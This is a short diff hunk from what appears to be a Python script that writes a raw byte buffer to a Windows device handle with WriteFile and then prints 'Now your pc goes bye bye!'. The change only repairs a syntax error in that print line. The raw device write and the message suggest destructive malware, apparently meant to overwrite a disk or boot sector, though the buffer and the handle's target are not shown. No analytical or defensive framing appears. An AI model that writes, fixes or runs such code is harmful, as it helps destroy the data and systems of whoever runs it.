@@ -13,7 +13,7 @@ buffer = bytes([
 ])
 
 bytes_written = WriteFile(hDevice, buffer, None)
-print("Now your pc goes bye bye!
+print("Now your pc goes bye bye!")
 
 
 CloseHandle(hDevice)
